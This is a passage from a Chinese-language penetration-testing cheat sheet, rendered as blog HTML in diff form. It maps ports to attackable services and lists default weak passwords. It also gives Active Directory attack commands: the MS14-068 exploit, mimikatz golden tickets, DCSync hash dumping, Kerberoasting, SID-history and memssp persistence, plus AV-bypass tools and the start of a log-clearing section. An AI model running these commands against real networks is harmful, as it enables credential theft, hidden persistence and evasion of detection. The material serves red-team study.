+<li>第三方通用組件漏洞：<ul>
+<li>struts</li>
+<li>thinkphp</li>
+<li>jboss</li>
+<li>ganglia</li>
+<li>zabbix</li>
+<li>…</li>
+</ul>
+</li>
+<li>80 - web</li>
+<li>80-89 - web</li>
+<li>8000-9090 - web</li>
+</ul>
+</li>
+<li>資料庫類 (掃描弱密碼)<ul>
+<li>1433 - MSSQL</li>
+<li>1521 - Oracle</li>
+<li>3306 - MySQL</li>
+<li>5432 - PostgreSQL</li>
+<li>50000 - DB2</li>
+</ul>
+</li>
+<li>特殊服務類 (未授權 / 命令執行類 / 漏洞)<ul>
+<li>443 - SSL HeartBleed</li>
+<li>445 - ms08067 / ms11058 / ms17010…</li>
+<li>873 - Rsync 未授權</li>
+<li>5984 - CouchDB (<code>http://xxx:5984/_utils/</code>)</li>
+<li>6379 - redis 未授權</li>
+<li>7001, 7002 - WebLogic 預設弱密碼、反序列</li>
+<li>9200, 9300 - elasticsearch (參考：<a target="_blank" rel="noopener" href="http://www.hackdig.com/?07/hack-11665.htm">多玩某服务器ElasticSearch命令执行漏洞</a>)</li>
+<li>11211 - memcache 未授權訪問</li>
+<li>27017, 27018 - Mongodb 未授權訪問</li>
+<li>50000 - SAP 命令執行</li>
+<li>50070, 50030 - hadoop 預設埠未授權訪問</li>
+</ul>
+</li>
+<li>常用埠類 (掃描弱密碼 / 埠爆破)<ul>
+<li>21 - FTP</li>
+<li>22 - SSH</li>
+<li>23 - Telnet</li>
+<li>445 - SMB 弱密碼掃描</li>
+<li>2601, 2604 - zebra 路由 (預設密碼：zebra)</li>
+<li>3389 - 遠端桌面</li>
+</ul>
+</li>
+<li>埠合計所對應的服務<ul>
+<li>21 - FTP</li>
+<li>22 - SSH</li>
+<li>23 - Telnet</li>
+<li>25 - SMTP</li>
+<li>53 - DNS</li>
+<li>69 - TFTP</li>
+<li>80 - web</li>
+<li>80-89 - web</li>
+<li>110 - POP3</li>
+<li>135 - RPC</li>
+<li>139 - NETBIOS</li>
+<li>143 - IMAP</li>
+<li>161 - SNMP</li>
+<li>389 - LDAP</li>
+<li>443 - SSL Heartbleed &amp; 一些 web 漏洞測試</li>
+<li>445 - SMB</li>
+<li>512-514 - Rexec</li>
+<li>873 - Rsync 未授權</li>
+<li>1025, 111 - NFS</li>
+<li>1080 - socks</li>
+<li>1158 - Oracle EMCTL</li>
+<li>1433 - MSSQL (暴力破解)</li>
+<li>1521 - Oracle (iSqlPlus Port: 5560, 7778)</li>
+<li>2082 / 2083 - cpanel 主機管理系統登入 (國外用得較多)</li>
+<li>2222 - DA 虛擬主機管理系統登入 (國外用得較多)</li>
+<li>2601, 2604 - zebra 路由 (預設密碼：zebra)</li>
+<li>3128 - squid 代理預設埠，如果沒設置密碼很可能就直接漫遊內網</li>
+<li>3306 - MySQL (暴力破解)</li>
+<li>3312 / 3311 - kangle 主機管理系統登入</li>
+<li>3389 - 遠端桌面</li>
+<li>3690 - svn</li>
+<li>4440 - rundeck (參考：<a target="_blank" rel="noopener" href="http://www.hackdig.com/03/hack-19064.htm">借用新浪某服务成功漫游新浪内网</a>)</li>
+<li>4848 - GlassFish，web 中間件，弱密碼：admin / adminadmin</li>
+<li>5432 - PostgreSQL</li>
+<li>5900 - vnc</li>
+<li>5984 - CouchDB (<code>http://xxx:5984/_utils/</code>)</li>
+<li>6082 - varnish (參考：<a target="_blank" rel="noopener" href="https://woo.zone.ci/bug_detail.php?wybug_id=wooyun-2012-012338">Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</a>)</li>
+<li>6379 - redis 未授權</li>
+<li>7001, 7002 - WebLogic 預設弱密碼、反序列</li>
+<li>7778 - Kloxo 主機控制面板登入</li>
+<li>8000-9090 - 都是一些常見的 web 埠，有些維運喜歡把管理後台開在這些非 80 的埠上</li>
+<li>8080 - Tomcat/WDCd/ 主機管理系統，預設弱密碼</li>
+<li>8080, 8089, 9090 - JBOSS</li>
+<li>8081 - Symantec AV / Filter for MSE</li>
+<li>8083 - Vestacp 主機管理系統 (國外用得較多)</li>
+<li>8649 - ganglia</li>
+<li>8888 - amh / LuManager 主機管理系統預設埠</li>
+<li>9000 - fcgi, fcig, php 執行</li>
+<li>9043 - websphere (web 中間件)，弱密碼：admin / admin、websphere / websphere、system / manager</li>
+<li>9200, 9300 - elasticsearch (參考：<a target="_blank" rel="noopener" href="http://www.hackdig.com/?07/hack-11665.htm">多玩某服务器ElasticSearch命令执行漏洞</a>)</li>
+<li>10000 - Virtualmin / Webmin 伺服器虛擬主機管理系統</li>
+<li>11211 - memcache 未授權訪問</li>
+<li>27017, 27018 - Mongodb 未授權訪問</li>
+<li>28017 - Mongodb 統計頁面</li>
+<li>50000 - SAP 命令執行</li>
+<li>50060 - hadoop</li>
+<li>50070, 50030 - hadoop 預設埠未授權訪問</li>
+</ul>
+</li>
+</ol>
+<h3 id="域滲透"><a href="#域滲透" class="headerlink" title="域滲透"></a><em>域滲透</em></h3><h4 id="情資蒐集"><a href="#情資蒐集" class="headerlink" title="情資蒐集"></a>情資蒐集</h4><ul>
+<li><code>powerview.ps1</code></li>
+<li><code>Get-NetDomain</code> - gets the name of the current user’s domain</li>
+<li><code>Get-NetForest</code> - gets the forest associated with the current user’s domain</li>
+<li><code>Get-NetForestDomains</code> - gets all domains for the current forest</li>
+<li><code>Get-NetDomainControllers</code> - gets the domain controllers for the current computer’s domain</li>
+<li><code>Get-NetCurrentUser</code> - gets the current [domain]username</li>
+<li><code>Get-NetUser</code> - returns all user objects, or the user specified (wildcard specifiable)</li>
+<li><code>Get-NetUserSPNs</code> - gets all user ServicePrinciplNames</li>
+<li><code>Get-NetOUs</code> - gets data for domain organization units</li>
+<li><code>Get-NetGUIDOUs</code> - finds domain OUs linked to a specific GUID</li>
+<li><code>Invoke-NetUserAdd</code> - adds a local or domain user</li>
+<li><code>Get-NetGroups</code> - gets a list of all current groups in the domain</li>
+<li><code>Get-NetGroup</code> - gets data for each user in a specified domain group</li>
+<li><code>Get-NetLocalGroups</code> - gets a list of localgroups on a remote host or hosts</li>
+<li><code>Get-NetLocalGroup</code> - gets the members of a localgroup on a remote host or hoosts</li>
+<li><code>Get-NetLocalServices</code> - gets a list of running services / paths on a remote host or hosts</li>
+<li><code>Invoke-NetGroupuserAdd</code> - adds a user to a specified local or domain group</li>
+<li><code>Get-NetComputers</code> - gets a list of all current servers in the domain</li>
+<li><code>Get-NetFileServers</code> - get a list of file servers used by current domain user</li>
+<li><code>Get-NetShare</code> - gets share information for a specified server</li>
+<li><code>Get-NetLoggedon</code> - gets users actively logged onto a specified server</li>
+<li><code>Get-NetSessions</code> - gets active sessions on a specified server</li>
+<li><code>Get-NetFileSessions</code> - returned combined <code>Get-NetSessions</code> and <code>Get-NetFiles</code></li>
+<li><code>Get-NetConnections</code> - gets active connections to a specific server resource (share)</li>
+<li><code>Get-NetFiles</code> - gets open files on a server</li>
+<li><code>Get-NetProcesses</code> - gets the remote processes and owners on a remote server</li>
+</ul>
+<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><ul>
+<li>獲取某 OU 下所有機器情資  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;name&quot;: &quot;Find the specified OU computers&quot;, </span><br><span class="line">	&quot;queryList&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;final&quot;: false, </span><br><span class="line">			&quot;title&quot;: &quot;Select a OU...&quot;,</span><br><span class="line">			&quot;query&quot;: &quot;MATCH (n:OU) RETURN distinct n.name ORDER BY n.name DESC&quot;</span><br><span class="line">				&#123;</span><br><span class="line">					&quot;final&quot;: true,</span><br><span class="line">					&quot;query&quot;: &quot;MATCH (m:OU &#123;name:$result&#125;) with m MATCH p=(o:OU &#123;objectid: m.objectid&#125;)-[r:Contains*1..]-&gt;(n:Computer) RETURN p&quot;,</span><br><span class="line">					&quot;allowCollapse&quot;: true,</span><br><span class="line">					&quot;endNode&quot;: &quot;&#123;&#125;&quot;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>自動標記 owned 用戶級機器<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Lz1y/SyncDog">SyncDog</a></li>
+</ul>
+</li>
+<li>獲取域內 DNS 情資<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a></li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/">域渗透——DNS记录的获取</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="獲取域控的方法"><a href="#獲取域控的方法" class="headerlink" title="獲取域控的方法"></a>獲取域控的方法</h4><ul>
+<li>SYSVOL<ul>
+<li>SYSVOL 是指儲存域公共文件伺服器副本的共享文件夾，它們在域中所有的域控制器之間複製</li>
+<li>SYSVOL 文件夾是安裝 AD 時創建的，它用來存放 GPO、Script 等情資，同時，存放在 SYSVOL 文件夾中的情資，會複製到域中所有 DC 上。</li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/92016.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></li>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>MS14-068 Kerberos  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用戶@域名 -p 密碼 -s 用戶SID -d 域主機</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用 mimikatz 將工具得到的 <a href="mailto:&#84;&#x47;&#x54;&#x5f;&#100;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x75;&#115;&#x65;&#114;&#64;&#83;&#69;&#82;&#86;&#x45;&#x52;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#x61;&#99;&#104;&#101;">&#84;&#x47;&#x54;&#x5f;&#100;&#x6f;&#x6d;&#97;&#x69;&#x6e;&#x75;&#115;&#x65;&#114;&#64;&#83;&#69;&#82;&#86;&#x45;&#x52;&#46;&#67;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#x61;&#99;&#104;&#101;</a> 寫入內存，創建緩存證書：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot;</span> exitnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure></li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=676">Exploiting MS14-068 Vulnerable Domain Controllers Successfully with the Python Kerberos Exploitation Kit (PyKEK)</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/56081.html">入解读MS14-068漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=541">Kerberos Vulnerability in MS14-068 (KB3011780) Explained</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SPN 掃描<ul>
+<li>Kerberoast 可以作為一個有效的方法從 Active Directory 中以普通用戶的身份提取服務帳戶憑證，無需向目標系統發送任何封包</li>
+<li>SPN 是服務在使用 Kerberos 身份驗證的網路上的唯一標識符，它由服務類、主機名、埠組成</li>
+<li>在使用 Kerberos 身份驗證的網路中，必須在內置電腦帳戶 (如 NetworkService 或 LocalSystem) 或用戶帳戶下為伺服器註冊 SPN</li>
+<li>對於內部帳戶，SPN 掃描的好處是：SPN 掃描不需要連接到網路上的每個 IP 來檢查服務埠，SPN 通過 LDAP 查詢向域控執行服務發現</li>
+<li>SPN 查詢是 Kerberos 的票據行為一部分，因此比較難檢測 SPN 掃描</li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/locate-and-attack-domain-sql-servers-without-scanning/">Locate and Attack Domain SQL Servers without Scanning</a></li>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN Scanning – Service Discovery without Network Port Scanning</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">PowerShell-AD-Recon</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Kerberos 的黃金票據<ul>
+<li>在域上抓取的 Hash  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:[<span class="built_in">hash</span>] /ticket:administrator.kiribi</span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br><span class="line">net user k: \p</span><br><span class="line">net user k: \pentest.comc$</span><br></pre></td></tr></table></figure></li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></li>
+<li><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></li>
+<li><a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Kerberos 的白銀票據<ul>
+<li>黃金票據和白銀票據的一些區別：<table>
+<thead>
+<tr>
+<th></th>
+<th>Golden Ticket</th>
+<th>Silver Ticket</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>偽造</td>
+<td>偽造 TGT，可以獲取任何 Kerberos 服務權限</td>
+<td>偽造 TGS，只能訪問指定的服務加密方式不同</td>
+</tr>
+<tr>
+<td>加密</td>
+<td>由 krbtgt 的 hash 加密</td>
+<td>由服務帳號 (通常是電腦帳戶) hash 加密</td>
+</tr>
+<tr>
+<td>認證流程</td>
+<td>使用的過程需要同域控通訊</td>
+<td>使用的過程不需要同域控通訊</td>
+</tr>
+</tbody></table>
+</li>
+<li>參考：<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">How Attackers Use Kerberos Silver Tickets to Exploit Systems</a></li>
+<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html">域渗透——Pass The Ticket</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>域服務帳號破解<ul>
+<li>與上面 SPN 掃描類似的原理 - <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">kerberoast</a> 獲取所有用作 SPN 的帳戶  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q */*</span><br></pre></td></tr></table></figure></li>
+<li>從 Mimikatz 的 RAM 中提取獲得的門票  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /<span class="built_in">export</span></span><br></pre></td></tr></table></figure></li>
+<li>用 rgsrepcrack 破解  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure></li>
+<li>憑證盜竊<ul>
+<li>從蒐集的密碼裡面找管理員的密碼</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>NTLM Relay<ul>
+<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">Abusing Exchange: One API call away from Domain Admin</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li>
+<li>Kerberos 委派</li>
+<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">S4U2Pwnage</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">A Case Study in Wagging the Dog: Computer Takeover</a></li>
+<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">The worst of both worlds: Combining NTLM Relaying and Kerberos delegation</a></li>
+<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin</a></li>
+</ul>
+</li>
+<li>地址解析協議<ul>
+<li>實在搞不定再搞 ARP</li>
+</ul>
+</li>
+<li>獲取 AD Hash<ul>
+<li>使用 VSS 卷影副本<ul>
+<li>Ntdsutil 中獲取 NTDS.DIT 文件</li>
+<li>PowerShell 中提取 NTDS.DIT –&gt; <code>Invoke-NinaCopy</code></li>
+<li>使用 Mimikatz 提取  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;lsadump::lsa /inject&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>使用 PowerShell Mimikatz<ul>
+<li>使用 Mimikatz 的 DCSync 遠端轉儲 Active Directory 憑證</li>
+<li>提取 KRBTGT 用戶帳戶的密碼數據：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li>
+<li>管理員用戶帳戶提取密碼數據：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li>
+<li>NTDS.dit 中提取 Hash –&gt; 使用 esedbexport 恢復以後使用 ntdsxtract 提取</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="AD-持久化"><a href="#AD-持久化" class="headerlink" title="AD 持久化"></a>AD 持久化</h4><ul>
+<li>活動目錄持久性技巧<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1929">Sneaky Active Directory Persistence Tricks</a></li>
+<li>Windows Server 2008 需要安裝 KB961320 的更新才支援 DSRM 密碼同步；Windows Server 2003 則不支援<ul>
+<li><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni">KB961320</a></li>
+<li>可參考：<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-9297.html">巧用 DSRM 密码同步将域控权限持久化</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DCShadow<ul>
+<li><a target="_blank" rel="noopener" href="https://www.dcshadow.com/">DCShadow</a></li>
+<li>Security Support Provider，簡單地理解 SSP 就是一個 DLL，用以實現身份認證  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debugmisc::memssp</span><br></pre></td></tr></table></figure></li>
+<li>如此就不需重啟 <code>c:/windows/system32</code> 就可看到新生成的文件 <code>kiwissp.log</code></li>
+</ul>
+</li>
+<li>SID Histroy<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1772">Sneaky Active Directory Persistence #14: SID Histroy</a></li>
+<li>SID 歷史紀錄允許一個帳戶的訪問被有效地複製到另一個帳戶  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;misc::addsid bobafett ADSAdministrator&quot;</span></span><br><span class="line">AdminSDHolder &amp; SDProp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>利用 <code>AdminSDHolder &amp; SDProp</code> (重新) 獲得域管理權限</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>組策略<ul>
+<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2716">Sneaky Active Directory Persistence #17: Group Policy</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86531">【技術分享】BadGPO: 組策略對象在持久化及橫向滲透中的應用</a></li>
+</ul>
+</li>
+<li>Hook PasswordChangeNotify<ul>
+<li><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">域滲透—-Hook PasswordChangeNotify</a></li>
+</ul>
+</li>
+<li>Kerberoasting 後門<ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透-Kerberoasting</a></li>
+</ul>
+</li>
+<li>AdminSDHolder<ul>
+<li><a target="_blank" rel="noopener" href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></li>
+</ul>
+</li>
+<li>Delegation<ul>
+<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
+<li>域內主機提權<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/SharpAddDomainMachine">SharpAddDomainMachine</a></li>
+</ul>
+</li>
+<li>Exchange 的利用<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Exchange2domain">Exchange2Domain</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581/">CVE-2018-8581</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040">CVE-2019-1040</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2020-0688">CVE_2020-0688</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS">NtlmRelayToEWS</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ewsManage">ewsManage</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">Dump-Clear-Text-Password-after-KB2871997-installed</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">域滲透—-Hook PasswordChangeNotify</a><ul>
+<li>可通過 Hook PasswordChangeNotify 即時記錄域控管理員的新密碼</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-10496.html">域渗透——Local Administrator Password Solution</a><ul>
+<li>域滲透時要記得留意域內主機的本地管理員帳號</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">域渗透——利用SYSVOL还原组策略中保存的密码</a></li>
+</ul>
+<h4 id="相關工具"><a href="#相關工具" class="headerlink" title="相關工具"></a>相關工具</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/DeathStar">DeathStar</a><ul>
+<li>利用過程：<a href="www.freebuf.com/sectool/160884.html">渗透测试自动化：使用NTLM中继和Deathstar获取域管理员权限</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="在遠端系統上執行程序"><a href="#在遠端系統上執行程序" class="headerlink" title="在遠端系統上執行程序"></a><em>在遠端系統上執行程序</em></h3><ul>
+<li>At</li>
+<li>Psexec</li>
+<li>WMIC</li>
+<li>Wmiexec</li>
+<li>Smbexec</li>
+<li>Powershell remoting</li>
+<li>DCOM</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Winrm</a></li>
+</ul>
+<h3 id="IoT-相關"><a href="#IoT-相關" class="headerlink" title="IoT 相關"></a><em>IoT 相關</em></h3><ol>
+<li>路由器 <a target="_blank" rel="noopener" href="https://github.com/reverse-shell/routersploit">routersploit</a></li>
+<li>印表機 <a target="_blank" rel="noopener" href="https://github.com/RUB-NDS/PRET">PRET</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploitee.rs/">IoT exp</a></li>
+<li>相關 <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/OWASP_Nettacker">OWASP-Nettacker</a></li>
+</ol>
+<ul>
+<li>Man-in-the-middle<ul>
+<li><a target="_blank" rel="noopener" href="http://www.oxid.it/cain.html">Cain</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ettercap/ettercap">Ettercap</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">Responder</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/MITMf">MITMf</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bettercap/bettercap">battercap</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="規避防毒及檢測"><a href="#規避防毒及檢測" class="headerlink" title="規避防毒及檢測"></a><em>規避防毒及檢測</em></h3><h4 id="Bypass-Applocker"><a href="#Bypass-Applocker" class="headerlink" title="Bypass Applocker"></a>Bypass Applocker</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/#">Ultimate AppLocker ByPass List</a></li>
+</ul>
+<h4 id="bypassAV"><a href="#bypassAV" class="headerlink" title="bypassAV"></a>bypassAV</h4><ul>
+<li>Empire</li>
+<li>PEspin</li>
+<li>Shellter</li>
+<li>Ebowla</li>
+<li>Veil</li>
+<li>PowerShell</li>
+<li>Python 程式碼注入技術</li>
+<li>Process Doppelgänging</li>
+<li>…</li>
+</ul>
+<hr>
+<h2 id="0x07-痕跡清除"><a href="#0x07-痕跡清除" class="headerlink" title="0x07 痕跡清除"></a><strong><u>0x07 痕跡清除</u></strong></h2><h3 id="Windows-日誌清除"><a href="#Windows-日誌清除" class="headerlink" title="Windows 日誌清除"></a><em>Windows 日誌清除</em></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/backup-3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/">渗透技巧——Windows日志的删除与绕过</a></li>
+<li>獲取日誌分類列表  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure></li>
+<li>獲取單個日誌類別的統計訊息<ul>
+<li>e.g. <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli <span class="string">&quot;windows powershell&quot;</span></span><br></pre></td></tr></table></figure></li>
